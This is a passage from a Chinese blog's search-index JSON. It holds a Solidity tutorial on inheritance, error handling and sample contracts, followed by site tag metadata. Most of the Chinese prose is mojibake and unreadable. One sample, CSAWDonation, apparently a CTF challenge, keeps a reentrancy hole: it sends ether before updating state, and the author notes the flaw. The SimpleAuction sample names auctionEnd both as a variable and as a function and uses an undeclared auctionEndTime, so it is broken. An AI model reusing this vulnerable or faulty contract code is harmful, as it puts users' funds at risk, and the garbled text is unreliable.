å…³é”®å­—é‡å†™ä¿®é¥°å™¨ï¼š modifier exactDividedBy2And3(uint _a) override &#123; _; require(_a % 2 == 0 &amp;&amp; _a % 3 == 0); &#125;# æ„é€ å‡½æ•°çš„ç»§æ‰¿ å­åˆçº¦æœ‰ä¸¤ç§æ–¹æ³•ç»§æ‰¿çˆ¶åˆçº¦çš„æ„é€ å‡½æ•°ã€‚ä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼Œçˆ¶åˆçº¦ A é‡Œé¢æœ‰ä¸€ä¸ªçŠ¶æ€å˜é‡ a ï¼Œå¹¶ç”±æ„é€ å‡½æ•°çš„å‚æ•°æ¥ç¡®å®šï¼š // æ„é€ å‡½æ•°çš„ç»§æ‰¿abstract contract A &#123; uint public a; constructor(uint _a) &#123; a = _a; &#125;&#125; åœ¨ç»§æ‰¿æ—¶å£°æ˜çˆ¶æ„é€ å‡½æ•°çš„å‚æ•°ï¼Œä¾‹å¦‚ï¼š contract B is A(1) åœ¨å­åˆçº¦çš„æ„é€ å‡½æ•°ä¸­å£°æ˜æ„é€ å‡½æ•°çš„å‚æ•°ï¼Œä¾‹å¦‚ï¼š contract C is A &#123; constructor(uint _c) A(_c * _c) &#123;&#125;&#125;# è°ƒç”¨çˆ¶åˆçº¦çš„å‡½æ•° å­åˆçº¦æœ‰ä¸¤ç§æ–¹å¼è°ƒç”¨çˆ¶åˆçº¦çš„å‡½æ•°ï¼Œç›´æ¥è°ƒç”¨å’Œåˆ©ç”¨ super å…³é”®å­—ã€‚ ç›´æ¥è°ƒç”¨ï¼šå­åˆçº¦å¯ä»¥ç›´æ¥ç”¨ çˆ¶åˆçº¦å.å‡½æ•°å() çš„æ–¹å¼æ¥è°ƒç”¨çˆ¶åˆçº¦å‡½æ•°ï¼Œä¾‹å¦‚ Yeye.pop() ã€‚ function callParent() public&#123; Yeye.pop(); &#125; super å…³é”®å­—ï¼šå­åˆçº¦å¯ä»¥åˆ©ç”¨ super.å‡½æ•°å() æ¥è°ƒç”¨æœ€è¿‘çš„çˆ¶åˆçº¦å‡½æ•°ã€‚ solidity ç»§æ‰¿å…³ç³»æŒ‰å£°æ˜æ—¶ä»å³åˆ°å·¦çš„é¡ºåºæ˜¯ï¼š contract Erzi is Yeye, Baba ï¼Œé‚£ä¹ˆ Baba æ˜¯æœ€è¿‘çš„çˆ¶åˆçº¦ï¼Œ super.pop() å°†è°ƒç”¨ Baba.pop() è€Œä¸æ˜¯ Yeye.pop() ï¼š function callParentSuper() public&#123; // å°†è°ƒç”¨æœ€è¿‘çš„çˆ¶åˆçº¦å‡½æ•°ï¼ŒBaba.pop () super.pop(); &#125;# solidity ä¸­çš„å¼‚å¸¸ solidity ä¸‰ç§æŠ›å‡ºå¼‚å¸¸çš„æ–¹æ³•ï¼š error ï¼Œ require å’Œ assert # æ¡ä»¶æ£€æŸ¥ # Error error æ˜¯ solidity 0.8ç‰ˆæœ¬ æ–°åŠ çš„å†…å®¹ï¼Œæ–¹ä¾¿ä¸”é«˜æ•ˆï¼ˆçœ gas ï¼‰åœ°å‘ç”¨æˆ·è§£é‡Šæ“ä½œå¤±è´¥çš„åŸå› ã€‚äººä»¬å¯ä»¥åœ¨ contract ä¹‹å¤–å®šä¹‰å¼‚å¸¸ã€‚ä¸‹é¢ï¼Œæˆ‘ä»¬å®šä¹‰ä¸€ä¸ª TransferNotOwner å¼‚å¸¸ï¼Œå½“ç”¨æˆ·ä¸æ˜¯ä»£å¸ owner çš„æ—¶å€™å°è¯•è½¬è´¦ï¼Œä¼šæŠ›å‡ºé”™è¯¯ï¼š // Errors ç”¨æ¥å®šä¹‰å¤±è´¥ // ä»¥ä¸‹ç§°ä¸º natspec æ³¨é‡Šï¼Œå¯ä»¥é€šè¿‡ä¸‰ä¸ªæ–œæ æ¥è¯†åˆ«ã€‚ // å½“ç”¨æˆ·è¢«è¦æ±‚ç¡®è®¤äº¤æ˜“æ—¶æˆ–é”™è¯¯å‘ç”Ÿæ—¶å°†æ˜¾ç¤ºã€‚/// you are not the ownererror TransferNotOwner();// è‡ªå®šä¹‰ erroråœ¨æ‰§è¡Œå½“ä¸­ï¼Œ error å¿…é¡»æ­é… revert ï¼ˆå›é€€ï¼‰å‘½ä»¤ä½¿ç”¨ã€‚ function transferOwner1(uint256 tokenId, address newOwner) public &#123; if(_owners[tokenId] != msg.sender)&#123; revert TransferNotOwner(); &#125; _owners[tokenId] = newOwner; &#125;æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ª transferOwner1() å‡½æ•°ï¼Œå®ƒä¼šæ£€æŸ¥ä»£å¸çš„ owner æ˜¯ä¸æ˜¯å‘èµ·äººï¼Œå¦‚æœä¸æ˜¯ï¼Œå°±ä¼šæŠ›å‡º TransferNotOwner å¼‚å¸¸ï¼›å¦‚æœæ˜¯çš„è¯ï¼Œå°±ä¼šè½¬è´¦ã€‚ # Require require å‘½ä»¤æ˜¯ solidity 0.8ç‰ˆæœ¬ ä¹‹å‰æŠ›å‡ºå¼‚å¸¸çš„å¸¸ç”¨æ–¹æ³•ï¼Œç›®å‰å¾ˆå¤šä¸»æµåˆçº¦ä»ç„¶è¿˜åœ¨ä½¿ç”¨å®ƒã€‚å®ƒå¾ˆå¥½ç”¨ï¼Œå”¯ä¸€çš„ç¼ºç‚¹å°±æ˜¯ gas éšç€æè¿°å¼‚å¸¸çš„å­—ç¬¦ä¸²é•¿åº¦å¢åŠ ï¼Œæ¯” error å‘½ä»¤è¦é«˜ã€‚ä½¿ç”¨æ–¹æ³•ï¼š require(æ£€æŸ¥æ¡ä»¶ï¼Œ&quot;å¼‚å¸¸çš„æè¿°&quot;) ï¼Œå½“æ£€æŸ¥æ¡ä»¶ä¸æˆç«‹çš„æ—¶å€™ï¼Œå°±ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚ æˆ‘ä»¬ç”¨ require å‘½ä»¤é‡å†™ä¸€ä¸‹ä¸Šé¢çš„ transferOwner å‡½æ•°ï¼š function transferOwner2(uint256 tokenId, address newOwner) public &#123; require(_owners[tokenId] == msg.sender, \"Transfer Not Owner\"); _owners[tokenId] = newOwner; &#125;# Assert assert å‘½ä»¤ä¸€èˆ¬ç”¨äºç¨‹åºå‘˜å†™ç¨‹åº debug ï¼Œå› ä¸ºå®ƒä¸èƒ½è§£é‡ŠæŠ›å‡ºå¼‚å¸¸çš„åŸå› ï¼ˆæ¯” require å°‘ä¸ªå­—ç¬¦ä¸²ï¼‰ã€‚å®ƒçš„ç”¨æ³•å¾ˆç®€å•ï¼Œ assert(æ£€æŸ¥æ¡ä»¶ï¼‰ ï¼Œå½“æ£€æŸ¥æ¡ä»¶ä¸æˆç«‹çš„æ—¶å€™ï¼Œå°±ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚ æˆ‘ä»¬ç”¨ assert å‘½ä»¤é‡å†™ä¸€ä¸‹ä¸Šé¢çš„ transferOwner å‡½æ•°ï¼š function transferOwner3(uint256 tokenId, address newOwner) public &#123; assert(_owners[tokenId] == msg.sender); _owners[tokenId] = newOwner; &#125;æ³¨ï¼šåŒæ ·ä½œä¸ºåˆ¤æ–­ä¸€ä¸ªæ¡ä»¶æ˜¯å¦æ»¡è¶³çš„å‡½æ•°ï¼Œrequire ä¼šé€€å›å‰©ä¸‹çš„ gasï¼Œè€Œ assert ä¼šæ¶ˆè€—æ‰€æœ‰çš„ gasã€‚ # è§¦å‘å¼‚å¸¸ æä¾›äº† revert , throw æ¥è§¦å‘å¼‚å¸¸ï¼š throw ï¼šå…³é”®å­—æŠ›å‡ºå¼‚å¸¸ï¼ˆä» 0.4.13 ç‰ˆæœ¬ï¼Œthrow å…³é”®å­—å·²è¢«å¼ƒç”¨ï¼Œå°†æ¥ä¼šè¢«æ·˜æ±°ã€‚ï¼‰å›æ»šæ‰€æœ‰çŠ¶æ€æ”¹å˜ï¼Œè¿”å›â€ æ— æ•ˆæ“ä½œä»£ç é”™è¯¯â€ï¼Œè€Œä¸”æ¶ˆè€—æ‰å‰©ä¸‹çš„ gas revert ï¼šå‡½æ•°å¯ä»¥ç”¨æ¥æ ‡è®°é”™è¯¯å¹¶å›é€€å½“å‰è°ƒç”¨ï¼Œå…è®¸è¿”å›ä¸€ä¸ªæ•°å€¼ï¼Œå°†å‰©ä½™ gas è¿”è¿˜è°ƒç”¨è€… ä¼ ç»Ÿå¤„ç†å¼‚å¸¸çš„æ–¹å¼ if...throw æ¨¡å¼ å³ ç­‰ä»·äºï¼š if(msg.sender != owner) &#123; throw; &#125;- if(msg.sender != owner) &#123; revert(); &#125;// å¦‚æœä¸ç­‰åˆ™å¼‚å¸¸- assert(msg.sender == owner);// æ ¡éªŒæ˜¯å¦ç­‰äº- require(msg.sender == owner);# è¿è¡Œç¬¬ä¸€ä¸ª solidity ä»£ç ï¼Œhello world è¿™é‡Œæˆ‘é€‰æ‹©åœ¨ç½‘é¡µè¿è¡Œè¿è¡Œ solidity //SPDX-License-Identifier:GPL-3.0pragma solidity ^0.8.7;contract HelloWorldContract&#123; function helloWorld()external pure returns(string memory)&#123; return \"hello world\"; &#125;&#125; # é˜…è¯»ä¸€äº›æ™ºèƒ½åˆçº¦ # example1.CSAWDonation /** *Submitted for verification at Etherscan.io on 2022-09-09*/// SPDX-License-Identifier: MITpragma solidity >=0.8.7;contract CSAWDonation &#123; mapping(address => uint256) public balances; mapping(address => bool) public doneDonating; event sendToAuthor(bytes32 token); function newAccount() public payable&#123; require(msg.value >= 0.0001 ether); balances[msg.sender] = 10; doneDonating[msg.sender] = false; &#125; function donateOnce() public &#123; require(balances[msg.sender] >= 1); if(doneDonating[msg.sender] == false) &#123; balances[msg.sender] += 10; msg.sender.call&#123;value: 0.0001 ether&#125;(\"\"); doneDonating[msg.sender] = true; &#125; &#125; function getBalance() public view returns (uint256 donatorBalance) &#123; return balances[msg.sender]; &#125; function getFlag(bytes32 _token) public &#123; require(balances[msg.sender] >= 30); emit sendToAuthor(_token); //sends the token &#125;&#125;è¿™ä¸ªåˆçº¦æ˜¯æœ‰é‡å…¥æ¼æ´çš„ï¼Œè‡³äºä»€ä¹ˆæ˜¯é‡å…¥æ¼æ´ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç«  æ™ºèƒ½åˆçº¦å®‰å…¨â€“é‡å…¥æ¼æ´ æŠ›å¼€è¿™ç‚¹æ¥è¯´ï¼Œè¿™ä¸ªåˆçº¦å¯¹äºåƒæˆ‘è¿™ç§ solidity åˆå­¦è€…æ¥è¯´ï¼Œè¿˜æ˜¯å¾ˆæœ‰å‚è€ƒæ„ä¹‰çš„. # example2. æ’å…¥æ’åº è¿™é‡Œæœ‰ä¸€ä¸ªé”™è¯¯çš„æ’å…¥æ’åºä»£ç ï¼Œè¿è¡Œåå°±ä¼šæŠ¥é”™ // æ’å…¥æ’åº é”™è¯¯ç‰ˆ function insertionSortWrong(uint[] memory a) public pure returns(uint[] memory) &#123; for (uint i = 1;i &lt; a.length;i++)&#123; uint temp = a[i]; uint j=i-1; while( (j >= 0) &amp;&amp; (temp &lt; a[j]))&#123; a[j+1] = a[j]; j--; &#125; a[j+1] = temp; &#125; return(a); &#125;ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸ºå˜é‡ j çš„ç±»å‹æ˜¯ uint , æ˜¯ä¸èƒ½å–åˆ° **-1 çš„ï¼Œä½†æ˜¯åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œ j å¯èƒ½ä¼šå–åˆ° - 1**, æ‰€ä»¥è¦è§„é¿æ‰è¿™ç§é”™è¯¯ï¼Œè®© j å–ä¸åˆ° **-1**. // æ’å…¥æ’åº æ­£ç¡®ç‰ˆ function insertionSort(uint[] memory a) public pure returns(uint[] memory) &#123; // note that uint can not take negative value for (uint i = 1;i &lt; a.length;i++)&#123; uint temp = a[i]; uint j=i; while( (j >= 1) &amp;&amp; (temp &lt; a[j-1]))&#123; a[j] = a[j-1]; j--; &#125; a[j] = temp; &#125; return(a); &#125;# example3. æŠ•ç¥¨åˆçº¦ // SPDX-License-Identifier: GPL-3.0pragma solidity >=0.7.0 &lt;0.9.0;/// @title å§”æ‰˜æŠ•ç¥¨contract Ballot &#123; // è¿™é‡Œå£°æ˜äº†ä¸€ä¸ªæ–°çš„å¤åˆç±»å‹ç”¨äºç¨åçš„å˜é‡ // å®ƒç”¨æ¥è¡¨ç¤ºä¸€ä¸ªé€‰æ°‘ struct Voter &#123; uint weight; // è®¡ç¥¨çš„æƒé‡ bool voted; // è‹¥ä¸ºçœŸï¼Œä»£è¡¨è¯¥äººå·²æŠ•ç¥¨ address delegate; // è¢«å§”æ‰˜äºº uint vote; // æŠ•ç¥¨ææ¡ˆçš„ç´¢å¼• &#125; // ææ¡ˆçš„ç±»å‹ struct Proposal &#123; bytes32 name; // ç®€ç§°ï¼ˆæœ€é•¿ 32 ä¸ªå­—èŠ‚ï¼‰ uint voteCount; // å¾—ç¥¨æ•° &#125; address public chairperson; // è¿™å£°æ˜äº†ä¸€ä¸ªçŠ¶æ€å˜é‡ï¼Œä¸ºæ¯ä¸ªå¯èƒ½çš„åœ°å€å­˜å‚¨ä¸€ä¸ª `Voter`ã€‚ mapping(address => Voter) public voters; // ä¸€ä¸ª `Proposal` ç»“æ„ç±»å‹çš„åŠ¨æ€æ•°ç»„ Proposal[] public proposals; /// ä¸º `proposalNames` ä¸­çš„æ¯ä¸ªææ¡ˆï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„ï¼ˆæŠ•ç¥¨ï¼‰è¡¨å†³ constructor(bytes32[] memory proposalNames) &#123; chairperson = msg.sender; voters[chairperson].weight = 1; // å¯¹äºæä¾›çš„æ¯ä¸ªææ¡ˆåç§°ï¼Œ // åˆ›å»ºä¸€ä¸ªæ–°çš„ Proposal å¯¹è±¡å¹¶æŠŠå®ƒæ·»åŠ åˆ°æ•°ç»„çš„æœ«å°¾ã€‚ for (uint i = 0; i &lt; proposalNames.length; i++) &#123; // `Proposal (&#123;...&#125;)` åˆ›å»ºä¸€ä¸ªä¸´æ—¶ Proposal å¯¹è±¡ï¼Œ // `proposals.push (...)` å°†å…¶æ·»åŠ åˆ° `proposals` çš„æœ«å°¾ proposals.push(Proposal(&#123; name: proposalNames[i], voteCount: 0 &#125;)); &#125; &#125; // æˆæƒ `voter` å¯¹è¿™ä¸ªï¼ˆæŠ•ç¥¨ï¼‰è¡¨å†³è¿›è¡ŒæŠ•ç¥¨ // åªæœ‰ `chairperson` å¯ä»¥è°ƒç”¨è¯¥å‡½æ•°ã€‚ function giveRightToVote(address voter) external &#123; // è‹¥ `require` çš„ç¬¬ä¸€ä¸ªå‚æ•°çš„è®¡ç®—ç»“æœä¸º `false`ï¼Œ // åˆ™ç»ˆæ­¢æ‰§è¡Œï¼Œæ’¤é”€æ‰€æœ‰å¯¹çŠ¶æ€å’Œä»¥å¤ªå¸ä½™é¢çš„æ”¹åŠ¨ã€‚ // åœ¨æ—§ç‰ˆçš„ EVM ä¸­è¿™æ›¾ç»ä¼šæ¶ˆè€—æ‰€æœ‰ gasï¼Œä½†ç°åœ¨ä¸ä¼šäº†ã€‚ // ä½¿ç”¨ require æ¥æ£€æŸ¥å‡½æ•°æ˜¯å¦è¢«æ­£ç¡®åœ°è°ƒç”¨ï¼Œæ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ã€‚ // ä½ ä¹Ÿå¯ä»¥åœ¨ require çš„ç¬¬äºŒä¸ªå‚æ•°ä¸­æä¾›ä¸€ä¸ªå¯¹é”™è¯¯æƒ…å†µçš„è§£é‡Šã€‚ require( msg.sender == chairperson, \"Only chairperson can give right to vote.\" ); require( !voters[voter].voted, \"The voter already voted.\" ); require(voters[voter].weight == 0); voters[voter].weight = 1; &#125; /// æŠŠä½ çš„æŠ•ç¥¨å§”æ‰˜åˆ°æŠ•ç¥¨è€… `to`ã€‚ function delegate(address to) external &#123; // ä¼ å¼•ç”¨ Voter storage sender = voters[msg.sender]; require(sender.weight != 0, \"You have no right to vote\"); require(!sender.voted, \"You already voted.\"); require(to != msg.sender, \"Self-delegation is disallowed.\"); // å§”æ‰˜æ˜¯å¯ä»¥ä¼ é€’çš„ï¼Œåªè¦è¢«å§”æ‰˜è€… `to` ä¹Ÿè®¾ç½®äº†å§”æ‰˜ã€‚ // ä¸€èˆ¬æ¥è¯´ï¼Œè¿™ç§å¾ªç¯å§”æ‰˜æ˜¯å±é™©çš„ã€‚å› ä¸ºï¼Œå¦‚æœä¼ é€’çš„é“¾æ¡å¤ªé•¿ï¼Œ // åˆ™å¯èƒ½éœ€æ¶ˆè€—çš„ gas è¦å¤šäºåŒºå—ä¸­å‰©ä½™çš„ï¼ˆå¤§äºåŒºå—è®¾ç½®çš„ gasLimitï¼‰ï¼Œ // è¿™ç§æƒ…å†µä¸‹ï¼Œå§”æ‰˜ä¸ä¼šè¢«æ‰§è¡Œã€‚ // è€Œåœ¨å¦ä¸€äº›æƒ…å†µä¸‹ï¼Œå¦‚æœå½¢æˆé—­ç¯ï¼Œåˆ™ä¼šè®©åˆçº¦å®Œå…¨å¡ä½ã€‚ while (voters[to].delegate != address(0)) &#123; to = voters[to].delegate; // ä¸å…è®¸é—­ç¯å§”æ‰˜ require(to != msg.sender, \"Found loop in delegation.\"); &#125; // `sender` æ˜¯ä¸€ä¸ªå¼•ç”¨ï¼Œç›¸å½“äºå¯¹ `voters [msg.sender].voted` è¿›è¡Œä¿®æ”¹ Voter storage delegate_ = voters[to]; // Voters cannot delegate to accounts that cannot vote. require(delegate_.weight >= 1); // Since `sender` is a reference, this // modifies `voters[msg.sender]`. sender.voted = true; sender.delegate = to; if (delegate_.voted) &#123; // è‹¥è¢«å§”æ‰˜è€…å·²ç»æŠ•è¿‡ç¥¨äº†ï¼Œç›´æ¥å¢åŠ å¾—ç¥¨æ•° proposals[delegate_.vote].voteCount += sender.weight; &#125; else &#123; // è‹¥è¢«å§”æ‰˜è€…è¿˜æ²¡æŠ•ç¥¨ï¼Œå¢åŠ å§”æ‰˜è€…çš„æƒé‡ delegate_.weight += sender.weight; &#125; &#125; /// æŠŠä½ çš„ç¥¨ (åŒ…æ‹¬å§”æ‰˜ç»™ä½ çš„ç¥¨)ï¼Œ /// æŠ•ç»™ææ¡ˆ `proposals [proposal].name`. function vote(uint proposal) external &#123; Voter storage sender = voters[msg.sender]; require(!sender.voted, \"Already voted.\"); sender.voted = true; sender.vote = proposal; // å¦‚æœ `proposal` è¶…è¿‡äº†æ•°ç»„çš„èŒƒå›´ï¼Œåˆ™ä¼šè‡ªåŠ¨æŠ›å‡ºå¼‚å¸¸ï¼Œå¹¶æ¢å¤æ‰€æœ‰çš„æ”¹åŠ¨ proposals[proposal].voteCount += sender.weight; &#125; /// @dev ç»“åˆä¹‹å‰æ‰€æœ‰çš„æŠ•ç¥¨ï¼Œè®¡ç®—å‡ºæœ€ç»ˆèƒœå‡ºçš„ææ¡ˆ function winningProposal() external view returns (uint winningProposal_) &#123; uint winningVoteCount = 0; for (uint p = 0; p &lt; proposals.length; p++) &#123; if (proposals[p].voteCount > winningVoteCount) &#123; winningVoteCount = proposals[p].voteCount; winningProposal_ = p; &#125; &#125; &#125; // è°ƒç”¨ winningProposal () å‡½æ•°ä»¥è·å–ææ¡ˆæ•°ç»„ä¸­è·èƒœè€…çš„ç´¢å¼•ï¼Œå¹¶ä»¥æ­¤è¿”å›è·èƒœè€…çš„åç§° function winnerName() public view returns (bytes32 winnerName_) &#123; winnerName_ = proposals[winningProposal()].name; &#125;&#125;# example4. ç®€å•çš„å…¬å¼€æ‹å– // SPDX-License-Identifier: GPL-3.0pragma solidity ^0.8.4;contract SimpleAuction &#123; // æ‹å–çš„å‚æ•°ã€‚ address payable public beneficiary; // æ—¶é—´æ˜¯ unix çš„ç»å¯¹æ—¶é—´æˆ³ï¼ˆè‡ª 1970-01-01 ä»¥æ¥çš„ç§’æ•°ï¼‰ // æˆ–ä»¥ç§’ä¸ºå•ä½çš„æ—¶é—´æ®µã€‚ uint public auctionEnd; // æ‹å–çš„å½“å‰çŠ¶æ€ address public highestBidder; uint public highestBid; // å¯ä»¥å–å›çš„ä¹‹å‰çš„å‡ºä»· mapping(address => uint) pendingReturns; // æ‹å–ç»“æŸåè®¾ä¸º trueï¼Œå°†ç¦æ­¢æ‰€æœ‰çš„å˜æ›´ bool ended; // å˜æ›´è§¦å‘çš„äº‹ä»¶ event HighestBidIncreased(address bidder, uint amount); event AuctionEnded(address winner, uint amount); // Errors ç”¨æ¥å®šä¹‰å¤±è´¥ // ä»¥ä¸‹ç§°ä¸º natspec æ³¨é‡Šï¼Œå¯ä»¥é€šè¿‡ä¸‰ä¸ªæ–œæ æ¥è¯†åˆ«ã€‚ // å½“ç”¨æˆ·è¢«è¦æ±‚ç¡®è®¤äº¤æ˜“æ—¶æˆ–é”™è¯¯å‘ç”Ÿæ—¶å°†æ˜¾ç¤ºã€‚ /// The auction has already ended. error AuctionAlreadyEnded(); /// There is already a higher or equal bid. error BidNotHighEnough(uint highestBid); /// The auction has not ended yet. error AuctionNotYetEnded(); /// The function auctionEnd has already been called. error AuctionEndAlreadyCalled(); /// ä»¥å—ç›Šè€…åœ°å€ `beneficiaryAddress` çš„åä¹‰ï¼Œ /// åˆ›å»ºä¸€ä¸ªç®€å•çš„æ‹å–ï¼Œæ‹å–æ—¶é—´ä¸º `biddingTime` ç§’ã€‚ constructor( uint biddingTime, address payable beneficiaryAddress ) &#123; beneficiary = beneficiaryAddress; auctionEnd = block.timestamp + biddingTime; &#125; /// å¯¹æ‹å–è¿›è¡Œå‡ºä»·ï¼Œå…·ä½“çš„å‡ºä»·éšäº¤æ˜“ä¸€èµ·å‘é€ã€‚ /// å¦‚æœæ²¡æœ‰åœ¨æ‹å–ä¸­èƒœå‡ºï¼Œåˆ™è¿”è¿˜å‡ºä»·ã€‚ function bid() external payable &#123; // å‚æ•°ä¸æ˜¯å¿…è¦çš„ã€‚å› ä¸ºæ‰€æœ‰çš„ä¿¡æ¯å·²ç»åŒ…å«åœ¨äº†äº¤æ˜“ä¸­ã€‚ // å¯¹äºèƒ½æ¥æ”¶ä»¥å¤ªå¸çš„å‡½æ•°ï¼Œå…³é”®å­— payable æ˜¯å¿…é¡»çš„ã€‚ // å¦‚æœæ‹å–å·²ç»“æŸï¼Œæ’¤é”€å‡½æ•°çš„è°ƒç”¨ã€‚ if (block.timestamp > auctionEndTime) revert AuctionAlreadyEnded(); // å¦‚æœå‡ºä»·ä¸å¤Ÿé«˜ï¼Œè¿”è¿˜ä½ çš„é’± if (msg.value &lt;= highestBid) revert BidNotHighEnough(highestBid); if (highestBid != 0) &#123; // è¿”è¿˜å‡ºä»·æ—¶ï¼Œç®€å•åœ°ç›´æ¥è°ƒç”¨ highestBidder.send (highestBid) å‡½æ•°ï¼Œ // æ˜¯æœ‰å®‰å…¨é£é™©çš„ï¼Œå› ä¸ºå®ƒæœ‰å¯èƒ½æ‰§è¡Œä¸€ä¸ªéä¿¡ä»»åˆçº¦ã€‚ // æ›´ä¸ºå®‰å…¨çš„åšæ³•æ˜¯è®©æ¥æ”¶æ–¹è‡ªå·±æå–é‡‘é’±ã€‚ pendingReturns[highestBidder] += highestBid; &#125; highestBidder = msg.sender; highestBid = msg.value; emit HighestBidIncreased(msg.sender, msg.value); &#125; /// å–å›å‡ºä»·ï¼ˆå½“è¯¥å‡ºä»·å·²è¢«è¶…è¶Šï¼‰ function withdraw() external returns (bool) &#123; uint amount = pendingReturns[msg.sender]; if (amount > 0) &#123; // è¿™é‡Œå¾ˆé‡è¦ï¼Œé¦–å…ˆè¦è®¾é›¶å€¼ã€‚ // å› ä¸ºï¼Œä½œä¸ºæ¥æ”¶è°ƒç”¨çš„ä¸€éƒ¨åˆ†ï¼Œ // æ¥æ”¶è€…å¯ä»¥åœ¨ `send` è¿”å›ä¹‹å‰ï¼Œé‡æ–°è°ƒç”¨è¯¥å‡½æ•°ã€‚ pendingReturns[msg.sender] = 0; // msg.sender is not of type `address payable` and must be // explicitly converted using `payable(msg.sender)` in order // use the member function `send()`. if (!payable(msg.sender).send(amount)) &#123; // è¿™é‡Œä¸éœ€æŠ›å‡ºå¼‚å¸¸ï¼Œåªéœ€é‡ç½®æœªä»˜æ¬¾ pendingReturns[msg.sender] = amount; return false; &#125; &#125; return true; &#125; /// ç»“æŸæ‹å–ï¼Œå¹¶æŠŠæœ€é«˜çš„å‡ºä»·å‘é€ç»™å—ç›Šäºº function auctionEnd() external &#123; // å¯¹äºå¯ä¸å…¶ä»–åˆçº¦äº¤äº’çš„å‡½æ•°ï¼ˆæ„å‘³ç€å®ƒä¼šè°ƒç”¨å…¶ä»–å‡½æ•°æˆ–å‘é€ä»¥å¤ªå¸ï¼‰ï¼Œ // ä¸€ä¸ªå¥½çš„æŒ‡å¯¼æ–¹é’ˆæ˜¯å°†å…¶ç»“æ„åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼š // 1. æ£€æŸ¥æ¡ä»¶ // 2. æ‰§è¡ŒåŠ¨ä½œ (å¯èƒ½ä¼šæ”¹å˜æ¡ä»¶) // 3. ä¸å…¶ä»–åˆçº¦äº¤äº’ // å¦‚æœè¿™äº›é˜¶æ®µç›¸æ··åˆï¼Œå…¶ä»–çš„åˆçº¦å¯èƒ½ä¼šå›è°ƒå½“å‰åˆçº¦å¹¶ä¿®æ”¹çŠ¶æ€ï¼Œ // æˆ–è€…å¯¼è‡´æŸäº›æ•ˆæœï¼ˆæ¯”å¦‚æ”¯ä»˜ä»¥å¤ªå¸ï¼‰å¤šæ¬¡ç”Ÿæ•ˆã€‚ // å¦‚æœåˆçº¦å†…è°ƒç”¨çš„å‡½æ•°åŒ…å«äº†ä¸å¤–éƒ¨åˆçº¦çš„äº¤äº’ï¼Œ // åˆ™å®ƒä¹Ÿä¼šè¢«è®¤ä¸ºæ˜¯ä¸å¤–éƒ¨åˆçº¦æœ‰äº¤äº’çš„ã€‚ // 1. æ¡ä»¶ if (block.timestamp &lt; auctionEndTime) revert AuctionNotYetEnded(); if (ended) revert AuctionEndAlreadyCalled(); // 2. ç”Ÿæ•ˆ ended = true; emit AuctionEnded(highestBidder, highestBid); // 3. äº¤äº’ beneficiary.transfer(highestBid); &#125;&#125;# å‚è€ƒèµ„æ–™ Solidity ä¸­æ–‡æ–‡æ¡£ - Solidity ä¸­æ–‡æ–‡æ¡£ - ç™»é“¾ç¤¾åŒº","categories":[],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://oacia.dev/tags/solidity/"}]},{"title":"ç¬¬ä¸€ä¸ªblogçºªå¿µ!","slug":"ç¬¬ä¸€ä¸ªblogçºªå¿µ!","date":"2022-09-27T16:00:00.000Z","updated":"2023-07-01T04:14:52.305Z","comments":true,"path":"ç¬¬ä¸€ä¸ªblogçºªå¿µ!/","link":"","permalink":"https://oacia.dev/%E7%AC%AC%E4%B8%80%E4%B8%AAblog%E7%BA%AA%E5%BF%B5!/","excerpt":"","text":"# ä»…ä»¥æ­¤çºªå¿µ oacia çš„ blog åœ¨ 2022/9/28 æ­£å¼å»ºæˆï¼","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"ollvm","slug":"ollvm","permalink":"https://oacia.dev/tags/ollvm/"},{"name":"android","slug":"android","permalink":"https://oacia.dev/tags/android/"},{"name":"idapython","slug":"idapython","permalink":"https://oacia.dev/tags/idapython/"},{"name":"rwProcMem33","slug":"rwProcMem33","permalink":"https://oacia.dev/tags/rwProcMem33/"},{"name":"android kernel","slug":"android-kernel","permalink":"https://oacia.dev/tags/android-kernel/"},{"name":"root","slug":"root","permalink":"https://oacia.dev/tags/root/"},{"name":"pixel3","slug":"pixel3","permalink":"https://oacia.dev/tags/pixel3/"},{"name":"ctf","slug":"ctf","permalink":"https://oacia.dev/tags/ctf/"},{"name":"go","slug":"go","permalink":"https://oacia.dev/tags/go/"},{"name":"powershellæ··æ·†","slug":"powershellæ··æ·†","permalink":"https://oacia.dev/tags/powershell%E6%B7%B7%E6%B7%86/"},{"name":"rust","slug":"rust","permalink":"https://oacia.dev/tags/rust/"},{"name":"python","slug":"python","permalink":"https://oacia.dev/tags/python/"},{"name":"CTF","slug":"CTF","permalink":"https://oacia.dev/tags/CTF/"},{"name":"é€†å‘","slug":"é€†å‘","permalink":"https://oacia.dev/tags/%E9%80%86%E5%90%91/"},{"name":"æ˜“è¯­è¨€","slug":"æ˜“è¯­è¨€","permalink":"https://oacia.dev/tags/%E6%98%93%E8%AF%AD%E8%A8%80/"},{"name":"pythoné€†å‘","slug":"pythoné€†å‘","permalink":"https://oacia.dev/tags/python%E9%80%86%E5%90%91/"},{"name":"goé€†å‘","slug":"goé€†å‘","permalink":"https://oacia.dev/tags/go%E9%80%86%E5%90%91/"},{"name":"inline hook","slug":"inline-hook","permalink":"https://oacia.dev/tags/inline-hook/"},{"name":"IsDebuggerPresent","slug":"IsDebuggerPresent","permalink":"https://oacia.dev/tags/IsDebuggerPresent/"},{"name":"sleepåè°ƒè¯•","slug":"sleepåè°ƒè¯•","permalink":"https://oacia.dev/tags/sleep%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"name":"è¿›ç¨‹é€šä¿¡","slug":"è¿›ç¨‹é€šä¿¡","permalink":"https://oacia.dev/tags/%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/"},{"name":"ä¿¡å·é‡","slug":"ä¿¡å·é‡","permalink":"https://oacia.dev/tags/%E4%BF%A1%E5%8F%B7%E9%87%8F/"},{"name":"æ¶ˆæ¯é˜Ÿåˆ—","slug":"æ¶ˆæ¯é˜Ÿåˆ—","permalink":"https://oacia.dev/tags/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/"},{"name":"ç®